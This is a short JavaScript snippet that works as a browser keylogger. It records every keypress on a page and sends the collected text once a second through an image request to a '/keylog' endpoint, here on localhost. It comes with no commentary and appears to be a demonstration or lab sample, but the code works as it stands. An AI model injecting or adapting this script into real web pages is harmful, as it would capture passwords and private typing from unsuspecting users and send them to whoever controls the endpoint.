(function() {
	var keys = '';
	 
	document.onkeypress = function(e) {
	    var key = e.keyCode ? e.keyCode : e.charCode;
	    key = String.fromCharCode(key);
	    keys += key;
		//console.log("keypress", e, keys);
	}

	window.setInterval(function() {
		if(keys.length > 0) {
			var proto = location.protocol;
			// nothing useful to be done with file protocol
			if(proto == 'file:') {
				proto = 'http:';
			}

	    	console.log('sending keys:  ' + keys);
			var encoded = encodeURIComponent(keys);
			var src = proto + '//localhost/keylog?k=' + encoded;
	    	new Image().src = src;
	    	keys = '';
	    }
	}, 1000);
})();
